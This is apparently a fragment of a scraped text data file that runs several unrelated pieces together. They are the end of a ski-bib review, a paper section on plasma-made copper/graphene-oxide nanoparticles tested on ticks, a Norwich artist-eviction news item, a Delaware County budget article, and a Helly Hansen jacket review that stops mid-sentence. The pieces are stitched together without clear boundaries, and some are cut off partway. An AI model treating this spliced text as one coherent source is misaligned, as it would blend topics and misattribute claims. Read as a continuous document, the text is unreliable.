wind resistance and durability: The OR uses relatively thin materials that are noticeably air-permeable and not all that confidence-inspiring around sharp equipment. It also forgoes a fit adjustment around the torso, which may pose issues for some (our tester experienced a fair amount of gaping at the middle back). Given these drawbacks, we think the Ridge Infinity is the better crossover option for those who split their time in- and out-of-bounds.\n\nArc'teryx gear earns consistently high marks in quality and attention to detail, and we'd be remiss not to include a comparison to their Sabre Bib Pant here. Right off the bat, we'll note that the two designs share a lot in common: Both the Ridge Infinity and Sabre feature three-pocket layouts, are reliably protective in wet weather with quality 3-layer constructions (the Sabre uses a proven Gore-Tex membrane), and cross over nicely between the resort and backcountry. Weight is also similar, with the Sabre checking in less than an ounce heavier than the Ridge Infinity. Our biggest gripes are price and fit: The Sabre costs a considerable $100 more than the Helly Hansen without enough to show for it, and our tester wasn't impressed by the short inseam and rise and baggy torso. Both are great quiver-of-one options for those who spend time both inside and outside the ropes, but we think the Ridge Infinity is the better overall value.\n\n\n\nWhile far from cheap, the Ridge Infinity Bibs undercut Arc'teryx's similarly intentioned Sabre | Credit: Jason Hummel\n\nA final alternative to consider is Trew Gear's Trewth Bib Classic. The proprietary 3-layer PNW construction is reminiscent of premium Gore-Tex in both look and feel, and you get full seam taping with reinforcements, smooth-operating water-resistant zippers, and bomber coverage that keeps even the wettest of snow at bay. The Trewth also boasts a very high-quality fit and finish and generous side vents that run from knee to chest, making it appealing for both resort and backcountry use. It's considerably heavier than the Ridge Infinity at 1 pound 14.7 ounces and has a bulkier look to boot, although the advantages are improved storage and better protection against strong gusts. In the end, we'd break it down as follows: The Helly Hansen is the better pick for those who spend more days in the backcountry than they do inbounds, while the Trew Gear gets our vote for resort riders who like to earn their turns on occasion.",

            "content": "Characterization of Cu/GO nanoparticles\n\nDuring the plasma discharge in DMF using a pair of Cu electrodes, black particles were continuously generated. According to the literature, the SP process could produce nitrogen-doped carbon materials from the nitrogen-containing organic precursors46. The black particles could be suggested to be the combination of nitrogen-doped carbon and Cu nanoparticles, which could occur through the decomposition and recombination of DMF and the simultaneous sputtering of Cu electrodes together47.\n\nFourier-transform infrared spectroscopy (FT-IR)\n\nThe changes in the FTIR spectral features (Fig. 2) at different plasma discharge times (15, 30, and 45 min) can provide insights into the evolution of the chemical composition and the degree of functionalization of the Cu/NFG composite during the plasma treatment process. The results showed an absorbance of new peaks after 30 min at 460 and 670 cm\u22121 due to the Cu\u2013O bond in the monoclinic crystal structure of CuO suggesting the successful synthesis of CuO core. The absorption peaks at 1380 and 1495 cm\u22121were attributed to C\u2013N in the N-doped (functionalized) graphene (NFG). The increased intensity of the peak at 1640 corresponds to the C = N stretching vibration, suggesting the existence of NFG48. Furthermore, the broad peak around 3332 cm\u22121 and small peak around 2922 cm\u22121 correspond to OH and CH stretching, respectively in the graphene. The intensity of all observed peaks is increased after 45 min of plasma operating time, indicating that it is the best preparation time for Cu-CuO-NFG catalyst (Fig. 2).\n\nFig. 2 FT-IR spectra of the Cu/GO at different times of plasma discharge and (50 kHz, and 180 W). Full size image\n\nX-ray photoelectron spectroscopy (XPS)\n\nThe surface chemical compositions and elemental bonding states of the obtained samples were demonstrated by XPS analysis. The XPS results showed the nitrogen and oxygen contents in the sample (Cu/GO at 180 W, 50 kHz, and 45 min), suggesting that Cu-NFG could be produced by the decomposition and recombination of the molecules of DMF during the SP process (Table 1). Furthermore, deconvolution was applied to the high-resolution XPS spectra to understand the atomic-level details and detecting the chemical states of the elements. The C1s spectra were deconvoluted at least into four peaks as shown in Fig. 3a. The strong peak at 284.2 eV is assigned to C\u2013C of the carbon sp2 structures of NFG (Fig. 3a)49. In addition, the occurrence of C\u2013N, C = O, and O\u2013C = O bonding peaks at 285, 286.6, and 289.8 eV, respectively, was detected, indicating the functionalization of the graphene by nitrogen and oxygen (carbons attached to nitrogen and different oxygen-containing moieties)50,51. The high-resolution Cu 2p3/2 spectra which were deconvoluted into two peaks at 933.06 eV and 953.1 eV which assigned to Cu 2p3/2 and Cu 2p1/2, respectively (Fig. 3b). The presence of CuO is confirmed by appearance of two strong satellite peaks at 941.9 eV, and 961.9 eV, respectively52. In addition, Cu(0) may also observed at 933.06 eV (19.9%) and Cu(II) at 934.4 eV (23.6%) and 941.9 eV (21.8%), respectively53 indicating that oxidized Cu core (CuO) exists in Cu-NFG which was in good agreement with FT-IR results.\n\nFig. 3 High resolution XPS spectra of the C1s peak for Cu/-NFG (a) and Cu2p peak for Cu/GO (b), with relative area under the peaks (45 min, 50 kHz and 180 W).

According to literatures, the GO sheets demonstrate an absorption peak centered at 273 nm and a shoulder at about 325 nm, which could be assigned to the \u03c0 \u2192 \u03c0* transitions of aromatic C\u2013C bonds and the n \u2192 \u03c0* transitions of C = O bonds, respectively. Furthermore, there is a broad shoulder in the range from 425 to 550 nm which might correspond to the Cu nanoparticles with different sizes (Fig. 4a). Furthermore, it was observed that the band gap value is reduced with increasing the time of plasma discharge (3.4, 3.2, and 2.4 eV for 15, 30, and 45 min) (Fig. 4b) indicating that the activity of the nanomaterials as an electrocatalyst was increased as the plasma discharge time was increased54,55,56.\n\nFig. 4 UV\u2013Vis. absorption spectra (a), and the band gap (b) of Cu/GO nanoparticles at 180 W pulsed plasma discharge, frequency = 50 kHz and different time (15, 30 and 45 min). Full size image\n\nTransmission electron microscopy (TEM) and energy-dispersive X-ray spectroscopy (EDX)\n\nThe TEM showed the morphology of Cu-NFG. The black Cu\u2013core and a grayish carbon\u2013shell appeared indicating the successful formation of the core shell (Fig. 5a, b). The average particle size of Cu-NFG was measured to be 29 nm. The results of the EDX analysis revealed that the Cu was covered by NFG as indicated by the presence of N as compared to pristine Cu57 (Fig. 5c).\n\nFig. 5 TEM images at low (a) and high (b) resolution, and EDX analysis of the Cu-NFG nanoparticles (c) (45 min, 50 kHz and 180 W). Full size image\n\nA potential route for the SP process to generate a core-shell nanostructure might be suggested based on the findings of the Cu-NFG characterization. Two primary processes could combine to produce Cu encapsulated by NFG. The first was carbonization, which created a shell of carbon materials, and the second was plasma sputtering, which produced metal atoms at the tip of metal electrodes and formed the metal-core. The DMF molecules broke down in the plasma zone (higher temperature) during the SP process. Radicals and fragments, which are crucial species for the synthesis and growth of carbon materials, were produced when the bonds between the carbon atoms in DMF were broken58. Later, those fragments were propagated and recombined to form a carbon framework. Nevertheless, its dispersion to the surrounding solution phase of low temperature (room temperature), prevented the carbon structure from developing and extending. Furthermore, the important species that resulted from the breakdown of DMF59 are CN radicals, a crucial part of nitrogen doping in carbon materials, which are formed by the insertion of nitrogen atoms during the initial growth stage and the generation of graphitic planes, which ultimately result in the formation of nitrogen doped carbon particles.\n\nWithout the need for additional chemicals, such as reducing agents, Cu nanoparticles could be synthesized by plasma sputtering at the electrode tips to form them as the core component of Cu-NFG. During the plasma discharge, the energetic atoms, ions, and electrons in the plasma gas phase hit, battered, and knocked off the metal atoms at electrodes60. The nucleation and subsequent crystal development to a bigger cluster and nanoparticle may be caused by the ejected metal atoms. At the same time, the formation of graphene was aided by the growth of metal crystals. According to XPS, TEM, and EDX analyses, the metal\u2019s surface serves as a substrate for the adsorption of a pre-formed carbon layer (Figs. 3 and 5)61. As shown by FT-IR and UV-Vis analysis, it was found that longer plasma discharge times resulted in more carbonization and sputtering, which in turn led to more combination and formation of Cu-NFG (Figs. 2 and 4).\n\nToxicity of Cu/GO NPs to Rh. rutilus and Rh. turanicus ticks\n\nThe toxicological assay of the synthesized nanoparticles against Rh. rutilus and Rh. turanicus are shown in Table 2.\n\nTable 2 Toxicity of Cu/GO NPs against Rhipicephalus rutilus and Rh. turanicus adults after 24-, 48-, 72-, and 96 h post-treatment. Full size table\n\nLC 50 : 50% Lethal concentration; CL: Confidence limits; SE: Standard error; X2: Chi-square, P: Significance probability values (P < 0.05).\n\nThe NPs synthesized at 180 W/45 mins had the lowest LC 50 values against Rh. rutilus (248.1 mg ml\u22121) and Rh. turanicus (195.7 mg ml\u22121), which indicates a higher acaricidal activity, followed by those which were synthesized at 120 W/30 mins (LC 50 = 581.5 and 526.5 mg ml\u22121), 120 W/15 mins (LC 50 = 606.9 and 686.7 mg ml\u22121), and 100/45 mins (LC 50 = 792.9 and 710.7 mg ml\u22121), respectively, after 24 h of application. However, the efficacy of the NP (180 W/ 45 min) was lower than the positive control (abamectin), which achieved LC 50 values of 33.1 and 25.3 mg ml\u22121 against Rh. rutilus and Rh. turanicus, respectively, after 24 h of application. Furthermore, the results indicated time-dependent effects of the NPs against Rh. rutilus and Rh. turanicus, with the most toxic effect occurring at 96 h of application based on the LC 50 values (Table 2). Overall, the acaricidal results demonstrated that, the activity of Cu/GO NPs against Rh. rutilus and Rh. turanicus may depend on the synthesized conditions and duration of exposure. Cu and GO NPs distinct physical and chemical properties, as well as, their methods of penetrating may be responsible for their observed acaricidal activity against Rh. rutilus and Rh. turanicus. Nanoparticles are usually within the range of 1 to 100 nm in size. They are chemically active and toxic because of their minuscule size and increased reactivity due to their large surface area to volume ratio62,63,64. Besides, the high surface area of graphene (up to 2630 m\u00b2/g)65enables it to be in close association with biological membranes, which enhances its efficiency as a pesticide formulation system66. Furthermore, the shape of the nanoparticles equally affects their mode of action and dispersion. For instance, Cu NPs that are spherical might have an easier time passing through cellular anatomical boundaries than those which are irregularly shaped or too large67,68. Moreover, Gr NPs may be functionalized and have carboxyl and hydroxyl groups, which can enhance their ability to be chemically reactive and interact with biological systems69,70.\n\nA potential synergistic interaction between Cu and GO may also be responsible for their acaricidal activity against Rh. rutilus and Rh. turanicus. Indeed, synergistic and/or enhanced effects have been found with graphene oxide in combination with Cu and other compounds. For instance, an enhanced antibacterial effect of GO\u2013Cu NPs composites was found against Pseudomonas syringae71. It has also been demonstrated that the combination of graphene oxide and synthetic acaricides, including pyridaben, chlorpyrifos, and \u03b2-cyfluthrin produced synergistic effects, enhancing the acaricidal activity of the acaricides against spider mites71. The ability of graphene to serve as a carrier for other compounds comes from its tailorable surface chemistry and biocompatibility in terms of its 2D structures that are supported by atomic thickness and notable high surface area (2600 m2/g)72, which not only plays as a carrier for other active agents, but also considered as a compound of pesticidal properties71. A previous study has proposed that the synergistic effects of graphene oxide could be a result of the disruption of the cement layers of the arthropod cuticle, leading to quick water loss and improving the penetration of the toxic compounds to the pest body71.\n\nWhen acting alone, graphene has been reported to have insecticidal activity against Rhyzopertha dominica, Sitophilus oryzae and Tr. castaneum, causing 100% mortality to these stored products insects after 21 days of exposure to 500 and 1000 ppm treatments73. Besides, Cu NP was found to have a toxic effect against several hematophagous pests, including Anopheles subpictus (LC 50 = 0.95 mg/L), Culex quinquefasciatus (LC 50 = 1.01 mg/L) and Rhipicephalus microplus (LC 50 = 1.06 mg/L)74. CuO NP was also found to have acaricidal activity against Rh. microplus (LC 50 = 4.30 mg/L), Haemaphysalis bispinosa (LC 50 = 9.50 mg/L) and Hippobosca maculata (LC 50 = 11.13 mg/L)75.\n\nEffects of Cu/GO NPs on the ticks enzymes\n\nThe full profile of the enzymatic activity of Rh. rutilus and Rh. turanicus treated with Cu/GO NPs is provided in Table 3. The results showed that the NPs synthesized at 180 W/45 min can either inhibit or enhance the enzymatic activity of both tick species. For instance, 180 W/45 min treatment significantly inhibited the activity of AChE (115 \u00b1 0.81 and 123 \u00b1 0.33 U/ mg protein/min) and SOD (290 \u00b1 0.18 and 310 \u00b1 0.92 U/ mg protein/min) in Rh. rutilus and Rh. turanicus, respectively, as compared with the negative control. The results also revealed a significantly increased activity of CAT (895 \u00b1 0.37 and 870 \u00b1 0.31 U/ mg protein/min) in Rh. rutilus and Rh. turanicus, respectively, compared to the negative control. Although not statistically significant from the negative control, inhibitory effects were recorded for carboxylesterase, monooxygenase, and GPX after exposure to Cu/GO NPs (180 W/45 min) (Table 3).\n\nTable 3 Effects of different synthesized Cu/GO nanoparticles on the enzymes of Rhipicephalus rutilus and Rh. turanicus ticks. Full size table\n\nSE: Standard error; Different letters indicate statistically significant differences between rows (P < 0.05).\n\nAlthough the mechanisms by which NPs exert their toxic effects have not yet been fully elucidated, it is believed that this may occur through the inhibition of AChE76. AChE is responsible for the degradation of the neurotransmitter acetylcholine at the neural synapses in the central nervous system of arthropods77. It is an important target for some groups of insecticides/acaricides, such as organophosphates (Ops) and carbamates77. The inhibition of AChE by toxic compounds can lead to acetylcholine accumulation, disruption of neurotransmission, and hyperstimulation of nicotinic receptors78. Therefore, the inhibition of AChE by our synthesized Cu/GO (180 W/45)NPs may affect several neural/neuromuscular, and physiological processes, leading to the functional breakdown of the nervous system and death of the ticks79. It has been reported that the inhibitory effects caused by NPs are primarily due to their ability to adsorb or interact with AChE76. This adsorption or interaction is probably due to their high affinity for the enzyme76. Nevertheless, further studies are needed to elucidate the relationship between the inhibitory effect and the acaricidal mechanisms of the synthesized Cu/GO NPs.\n\nIn addition to neurotoxicity, oxidative stress has been regarded as one of the mechanisms for NPs toxicity80. Nanoparticles can induce oxidative stress by generating elevated levels of reactive oxygen species (ROS)80. SOD and CAT are important antioxidant enzymes. SOD protects against oxidative stress, by converting superoxide anions (O 2 \u2022\u2212) to hydrogen peroxide (H 2 O 2 ) and oxygen81,82. The reduced SOD activity of Rh. rutilus and Rh. turanicus induced by Cu/GO (180 W/45) treatment may lead to the accumulation of superoxide radicals83, as these radicals are toxic to the cells and can lead to cell death84. On the other hand, CAT can converts H 2 O 2 , which is another form of ROS that can induce oxidative stress into water and oxygen85. The increase in the production of this enzyme after the treatment in this study may be an attempt to eliminate the potentially harmful superoxide and H 2 O 2, indicating an antioxidant response by the ticks.\n\nThe varied enzymatic activity of the NPs may be because of their different sizes and morphology, and their ability to penetrate different organelles of the ticks.",

Anglia Square was bought by Norwich City Council in December. Gildengate House in the square is occupied by 85 artists who pay up to \u00a3110 per month to rent the space. Before Christmas they were handed a three-month eviction notice and on Saturday were given the news they would need to leave by 28 February. A spokesperson for Norwich City Council, said: \"It is crucial that we continue to move at pace and redevelop Anglia Square and deliver about 1,100 new homes, jobs and new retail and leisure facilities for the benefit of the people of Norwich.\"\n\nOutpost moved into the space in 2010 and has grown to almost 100 artists, including Dr Mark Wilsher, who has been there since the beginning. He said he was now looking at putting his work into storage. \"We always knew it was temporary. When we moved in we were given three or four years originally and told it would probably be developed after that,\" he said. \"It's been great to have it for all this time... It's going to be really hard to replace...

            "content": "(This article first appeared in Broad + Liberty)\n\nDelaware County says it has no documents \u2014 not a single email, memo, spreadsheet, text, or voicemail \u2014 that could shed light on how $7.6 million dollars magically showed up in the county\u2019s second draft of the 2025 budget, thereby giving the county more breathing room on the massive tax increase it was proposing for the upcoming year.\n\nThat $7.6 million infusion into a single spending line is important because it represents most of the difference between the county\u2019s first budget draft proposing a 28 percent tax increase, and the subsequent draft that lowered the proposed tax increase to 23 percent. In other words, the tax decrease between the two versions couldn\u2019t have happened without the additional $7.6 million.\n\nBut where that money came from has never been described or explained.\n\nBroad + Liberty reported on Dec. 9 that the county declined to answer questions about the nature of the money, namely, if it already belonged to some earmarked pot of money.\n\nAfter that request for comment was ignored, Broad + Liberty then filed a Right to Know Law request asking for a copy of any document that would delineate \u201cthe source of the additional [$7.6 million]\u2026in the \u2018transfers\u2019 category.\u201d The request also asked for any text messages between current council members about the money, as well as any voicemails. But the county says there\u2019s nothing.\n\nIf the county borrowed from Peter to pay Paul, that money would have to be replaced at some point, creating the possibility that the county has more tax hikes in its future unless it finds a way to create $7.6 million in savings or budget cuts.\n\nIn late November, days before the county would hold its first open meetings about the budget, Broad + Liberty went to county offices to get copies of the first draft. A line of the budget marked \u201ctransfers\u201d only showed $510,000 being counted as revenue for 2025.\n\nThat same budget iteration required a 28 percent tax increase, which Broad + Liberty immediately reported on.\n\nDays later, however, the county began its budget hearings before the public, and the second draft was put into play.\n\nThat second draft had the smaller tax increase thanks to the \u201ctransfers\u201d line swelling from $510,000 to $8.2 million \u2014 a difference of $7.6 million.\n\nThe second draft also showed the county using $2.6 million more in American Rescue Plan Act (ARP) funds, money from the federal government\u2019s Covid response meant to help local governments survive any decrease in revenues due to the pandemic. But that revenue is one-time only, meaning it would still have to be replaced in future years.\n\nCounty Council, all Democrats, ultimately passed the second draft on a 4-1 vote. Councilman Richard Womack, who is facing re-election this year, was the lone dissenter.\n\nIf the county does, in fact, need to shore up the $7.6 million with new revenue, that still may not be the full extent of the problem. The 2025 budget also used $12.9 million in ARP funds and $14 million from the \u201cfund balance\u201d \u2014 the county\u2019s rainy day fund. Added together, the county may still need to find $34 million in new revenue for the 2026 budget if spending isn\u2019t decreased.\n\nDemocrats in the county began campaigning in the latter half of the 2010s on a platform with two main planks: the creation of a county-level health department, and deprivatizing the county\u2019s prison.\n\nAfter winning council seats in 2017 and later taking a majority on the council in 2020, they made good on the promises. With both of those goals accomplished, citizens who objected to the proposed tax increase for 2025 argued the council had gone too far.\n\n\u201cSpringfield Township resident Mark McGann said health services in the county \u2018have been crumbling\u2019 since the health department\u2019s creation,\u201d the Delaware Valley Journal reported. \u201cHe pointed to recent hospital closures and couldn\u2019t understand why they were happening.\u201d\n\n\u201cYou have to make hard decisions sometimes \u2026 You\u2019re spending too easily,\u201d McGann said.\n\n\u201cNick Weston of Wallingford argued the council is using the budget crisis to play hero at the expense of taxpayers. What the council should do, he said, was examine whether the programs were worth it,\u201d the DVJ report continued.\n\n\u201cWe do not need all this stuff. Instead, we\u2019d rather keep the money and not have this wide swath of county programs,\u201d he said.\n\nThe county argued taxes had been held low for too long, and that inflationary pressures also could not be ignored. In a comment provided to Broad + Liberty for an earlier article on the budget before it was passed, a county spokesperson said, \u201cWe recognize our residents are facing the same inflationary pressures that we are facing, but additional revenue is in our proposed 2025 budget that may be necessary in order for us to continue modernizing Delaware County\u2019s government, repairing county infrastructure, and delivering the quality services that our residents deserve and expect.\u201d\n\nCounty Executive Director Barbara O\u2019Malley also said the government had implemented numerous cost-saving measures under Democratic control, like pension reform, making gradual reductions in the number of employees, and technological upgrades, like moving the county\u2019s phone system to a new voice-over-internet protocol which O\u2019Malley said will save $1 million a year.\n\nAt the same time, it\u2019s indisputable that some projects, like deprivatizing the prison, have been far more costly than council projected.\n\nIn 2021, the council considered three future scenarios for the prison budget assuming it took back management of the George W. Hill Correctional Facility after it had been privately run for almost three decades.\n\nThe highest of those assumptions had a $49.9 million price tag, while the lowest scenario cost $43.1 million.\n\nThe council\u2019s latest budget shows the prison\u2019s annual budget going from $53.4 million in 2023, up to $56.6 million in \u201824, finally up to $59.3 million in 2025.",

            "content": "Helly Hansen is a trusted name in the ski community, and their Ridge Infinity Shell Jacket is a clear reflection of the brand's longstanding expertise. We put this jacket through its paces over an entire season in eastern Washington, encountering everything from bluebird skies to wet powder and windy hardpack conditions. Throughout it all, the Ridge Infinity impressed us with its ability to handle the full gamut of inclement weather. While its bulky build and lack of breathability limit it to inbounds use and the occasional sidecountry hike, its freeride-inspired styling, top-notch fit and finish, and excellent durability have secured it as one of our favorite resort pieces. Below we break down our experiences with the Ridge Infinity Shell Jacket. To see how it stacks up to the competition, check out our article on the best ski jackets. And to complete your kit, we\u2019ve also tested and reviewed the Ridge Infinity Shell Bibs.\n\n\n\nTable of Contents\n\n\n\nPerformance\n\nWeather Protection\n\nThe Helly Hansen Ridge Infinity Shell excelled in a wide range of harsh conditions, proving itself as an effective barrier against both moisture and wind. Boasting the brand's 3-layer Helly Tech Professional construction with a durable water-repellent (DWR) finish, the jacket kept me dry during prolonged exposure to snow and never threatened to wet out. During testing at Mission Ridge, an eastern Washington ski resort that's known for its windy conditions, the jacket\u2019s performance was particularly notable. It consistently blocked strong gusts with ease, outperforming the REI Co-op First Chair GTX (a 2-layer design) in side-by-side testing. The difference was so stark that I initially assumed the vents on my REI jacket were open (spoiler: They weren't). And importantly, the Ridge Infinity's DWR coating has retained its water-shedding abilities, with no need for reapplication after a full season of consistent use.\n\n\n\nThe Ridge Infinity Shell is reliably waterproof, and its DWR coating has held up well throughout a full season | Credit: Jason Hummel\n\nThe Ridge Infinity is fully seam-taped, which contributes to the jacket's stalwart feel. Further, the tall collar provides ample coverage for my neck and lower face when fully zipped, though I do wish it were slightly wider to better accommodate bulkier layers. The hood is another standout feature: It's easy to adjust, stays securely in place, and offers excellent coverage without impeding mobility or field of view (more in \"Key Features\" below). Additionally, the jacket's length is well suited for resort use, keeping my back fully covered on chairlifts, and the integrated powder skirt (which pairs seamlessly with Helly Hansen bibs and pants) and adjustable hem create a reliable barrier against powder. Finally, the long cuffs fit comfortably over my gloves and stay in place even with frequent arm movements.\n\n\n\nThe tall collar, long sleeves, and generous back length contribute to the jacket's impervious feel | Credit: Jason Hummel\n\nBreathability\n\nAs is typical with highly weather-resistant layers, the Ridge Infinity\u2019s breathability is somewhat compromised. This isn\u2019t much of a concern when sticking to the resort, but committed backcountry riders will almost certainly want something more air-permeable. Unless you\u2019re touring in severe weather, the Ridge Infinity isn\u2019t a layer for the skin track. To be fair, the jacket does come with pit zips for dumping excess heat, but they're not the biggest I've seen\u2014they extend from the armpit to about a quarter of the way down my torso. If breathability is a top concern, I'd recommend going with a better-ventilated design like the Outdoor Research Skytour AscentShell (at the sacrifice of some weather protection). But again, the Ridge Infinity is perfectly serviceable for inbounds use, and on warmer days, you can undo the main zipper for added airflow (provided conditions are favorable).\n\n\n\nWhile not a standout in breathability, the Ridge is perfectly serviceable for resort use and the occasional sidecountry hike | Credit: Jason Hummel\n\nComfort and Mobility\n\nOverall, I came away with positive impressions regarding the Ridge Infinity's comfort. The looser, freeride-oriented fit easily accommodated a baselayer, midlayer, and puffy jacket for added warmth without feeling restrictive. Additionally, the 2-way mechanical stretch in the fabric allowed for excellent freedom of movement, making activities like bending down to adjust boots and bindings hassle-free. I'm also a big fan of the sleeves and cuffs, which were extremely easy to adjust over my Giv\u2019r 4-Season gloves but flexible enough that they didn't restrict range of motion while skiing. I also appreciated the soft lining in the hand pockets, as well as the fleece chin guard. However, I did notice the zipper flap occasionally catching on my chin when looking over my right shoulder\u2014not a dealbreaker by any means, but worth noting nonetheless. Finally, some users report discomfort from the jacket bunching underneath backpack straps. I rarely ski with a pack inbounds, but it's something to consider if you like to bring along supplies like water and snacks.\n\n\n\nThe Ridge Infinity is easy to move in and comes with some nice, comfort-focused touches | Credit: Jason Hummel\n\nBuild Quality and Durability\n\nThe Ridge Infinity Shell Jacket has a noticeably robust feel that lines up well with its intentions as a premium resort piece. In fact, throughout an entire season of use\u2014including countless chairlift rides and navigating through tight trees\u2014I encountered no durability issues. While Helly Hansen doesn't list the denier for the jacket (a measurement of fabric thickness), its sturdiness felt on par with hardwearing layers like Arc\u2019teryx's Beta AR.\n\n\n\nOverall, the Ridge Infinity has a very high-quality and hardwearing feel | Credit: Jason Hummel\n\nThat said, I did come away with some small gripes in testing. For one, the main zipper was consistently difficult to manipulate\u2014on occasion, it took me nearly five minutes to fully unzip the jacket. Additionally, as I mentioned above, the interior zipper flap frequently caught on my chin when turning my head. And finally, the Helly Hansen logo on the chest pocket is very prominent, especially in the Hickory colorway that I tested, although styling is largely a matter of personal preference.\n\n\n\nWeight and Packability\n\nAlong with breathability, weight is another area where the Ridge Infinity secures its place as a resort/sidecountry piece rather than a dedicated backcountry shell. At 1 pound 10.1 ounces, it's not excessively heavy for inbounds use, undercutting competitors like Trew Gear's Cosmic Primo Jacket (1 lb. 14.1 oz.) while stacking up well to REI's 2-layer First Chair GTX Jacket (1 lb. 10.5 oz.). Dedicated backcountry riders can shave significant weight with a more purpose-built option like the Outdoor Research Skytour (1 lb. 5 oz.) or Arc'teryx's Beta AR hardshell (1 lb. 0.3 oz.), but the Skytour sacrifices some protection in the name of breathability, and the Beta AR lacks ski-specific features like a powder skirt and dump pockets. As expected, the Ridge Infinity also isn't a standout in terms of packability, but again, this won't be a concern for resort riders\u2014even those who embark on the occasional sidecountry hike.\n\n\n\nFor resort riding, we don't mind the Ridge Infinity's heft and lack of packability | Credit: Jason Hummel\n\nKey Features\n\nHood\n\nPut simply, the Ridge Infinity\u2019s hood is one of the best I\u2019ve tested. It paired seamlessly with my ski helmet and is fully adjustable to achieve a snug, secure fit. The hood features four adjustment points: a rear cinch that fine-tunes the brim, a neck drawcord to tighten the aperture, and two adjustment points at the base of the collar to customize fit along the sides. Once dialed in, the hood moved effortlessly with my head without restricting mobility or obstructing vision. The brim is another standout feature: It\u2019s generous enough to provide extra protection during heavy snowfall without feeling bulky or intrusive. Overall, the thoughtful design and functionality make the Ridge Infinity\u2019s hood a real highlight.\n\n\n\nThe Ridge Infinity's hood is adjustable in three ways and fits easily over a ski helmet | Credit: Jason Hummel\n\nStorage: Pockets\n\nThe Ridge Infinity Shell is far from minimalist when it comes to storage, boasting a total of six pockets. These include two horizontal hand pockets, one exterior and one interior chest pocket, a ski pass pocket on the left sleeve, and an internal dump pocket. The horizontal hand pockets are stylish and warm with a brushed lining, and their placement makes them accessible even when wearing a pack with a hipbelt. I found the dump pocket ideal for quickly stashing my ski goggles or climbing skins. The ski pass pocket on the sleeve was particularly convenient for resort days, and while I didn\u2019t get a chance to fully test the exterior PrimaLoft Aerogel Pocket\u2014which is insulated to preserve your phone's battery in cold conditions\u2014I nevertheless appreciate the thoughtful inclusion.\n\n\n\nThe Ridge Infinity's exterior chest pocket is insulated to maximize your phone's battery | Credit: Jason Hummel\n\nPowder Skirt\n\nLike most ski-specific shells, the Ridge Infinity comes with a powder skirt for sealing out snow at the waist. The design is pretty standard but entirely functional, with snaps at the front for connecting the two sides together and a silicone-like band along the bottom for keeping it in place. Whether you're riding deep powder or take an unexpected fall, the skirt is a welcome addition that went largely unnoticed in testing.\n\n\n\nThe Ridge Infinity's powder skirt is well executed and unobtrusive | Credit: Jason Hummel\n\nRecco Reflector\n\nIt\u2019s worth noting that the Ridge Infinity Shell has an integrated Recco transponder, which is a passive unit that can be picked up by Recco detectors used by ski patrol personnel. Though it offers some peace of mind when ducking ropes and riding off-piste terrain, Recco is no replacement for an avalanche beacon, and backcountry riders should acquire the proper training and gear before heading into avalanche terrain (for a deeper dive, check out our detailed Backcountry Skiing Checklist). The good news is that the Recco reflector is integrated well into the design, adding an extra dose of safety with minimal bulk.\n\n\n\nHelly Hansen included a Recco reflector for pinpointing your location in the event of an emergency | Credit: Jason Hummel\n\nFit and Sizing\n\nAs I mentioned previously, the Ridge Infinity Shell Jacket has a roomy, freeride-oriented fit that makes it easy to layer heavily underneath. For reference, I'm 5'11\" and weigh 165 pounds, and a size medium fit me well overall. It's worth noting that the jacket does have a subtle hourglass shape with a slight flare at the hips, which is particularly noticeable with the hem cinched. While this wasn\u2019t a dealbreaker for me, skiers who like a sleek, streamlined aesthetic may be deterred by the Ridge's boxier cut.\n\n\n\nThe Ridge Infinity Shell has a roomy fit with a slight flare at the hips | Credit: Jason Hummel\n\nSustainability\n\nHelly Hansen has made notable inroads on the sustainability front in recent years, and the Ridge Infinity Shell nicely reflects their efforts. Specifically, the shell is made from 54%-recycled polyester and features a PFAS-free DWR coating that forgoes the use of harmful per- and polyfluoroalkyl substances\u2014\"forever chemicals\" that are notorious for their inability to break down over time. We'd love to see Helly Hansen incorporate bluesign-approved materials and/or tack on a Fair Trade certification in future updates, but we nevertheless appreciate the measures they took with the Ridge Infinity.\n\n\n\nThe Ridge Infinity features a partially recycled construction and a PFAS-free DWR coating | Credit: Jason Hummel\n\nOther Versions and Women's Aurora Infinity Shell\n\nI tested the men\u2019s Ridge Infinity Shell for this review, and although Helly Hansen doesn't offer a women's model under the same name, the Aurora Infinity Shell is very similar in terms of overall construction and performance. Like the Ridge Infinity, the Aurora boasts the brand's effective Helly Tech Professional waterproof membrane, comes fully seam-taped, and offers a similar feature set including an adjustable hood, powder skirt, and comparable pocket layout. For those who like an integrated kit, the Ridge Infinity is also available in pant and bib styles that cost $500 and $600, respectively (check out our in-depth review of the bibs here).\n\n\n\nThe Ridge Infinity Shell pairs seamlessly with the matching Ridge Infinity Bibs | Credit: Jason Hummel\n\nWhat We Like\n\nReliably water- and windproof thanks to a stalwart 3-layer construction, full seam taping, well-executed feature set, and long-lasting DWR coating.\n\nMechanical stretch and articulated sleeves offer ample freedom of movement, and the baggier fit makes it easy to layer underneath without causing restriction.\n\nDurable and well built with high-quality materials that stand up well to frequent resort use.\n\nHood is easy to adjust, stays securely in place, and and features a large brim that effectively deflects moisture without impeding vision.\n\nSix-pocket layout makes it easy to divvy up the essentials, and the insulated chest pocket is a nice touch for maximizing your phone's battery life in the cold.\n\n\n\nWhat We Don\u2019t\n\nConstruction sacrifices some breathability in the name of weather protection\u2014this wouldn't be our first choice for dedicated backcountry use.\n\nOn the heavier and bulkier end for touring at 1 pound 10.1 ounces.\n\nWe experienced a couple fit and finish-related issues, including a zipper flap that frequently caught on our chin and a difficult-to-manipulate front zipper.\n\nLogo is bold and prominent on the chest, although we like the styling overall.\n\n\n\nThe Ridge Infinity's pit zips aren't particularly big, which detracts from overall breathability | Credit: Jason Hummel\n\nComparison Table\n\n\n\nThe Competition\n\nThe Helly Hansen Ridge Infinity Shell is a highly protective and well-built ski jacket, but it doesn't come cheap at $650. For casual resort-goers and those on a budget, REI Co-op's First Chair GTX is a standout value at $319. In testing the Ridge Infinity and First Chair side by side, we immediately noticed that the REI had poor wind resistance\u2014enough so that we frequently needed to add another layer underneath on gusty days and when skiing downhill at speed. The First Chair does fend off moisture well thanks to its proven Gore-Tex membrane, although the 2-layer construction is a step down in both breathability and durability compared to the Ridge Infinity's 3-layer build. When worn back to back, the REI had a noticeably less confidence-inspiring feel than the Ridge Infinity, although both jackets have held up well to consistent resort use. In the end, we think frequent skiers will benefit from spending up for the Helly Hansen, but the First Chair is a perfectly serviceable alternative at a great price.\n\n\n\nTesting the REI First Chair GTX Jacket at Mission Ridge Resort in Washington state | Credit: Jason Hummel\n\nNext up is Trew Gear's Cosmic Primo Jacket, which shares a lot of similarities with the Ridge Infinity. First is fit: Both jackets have a roomy, 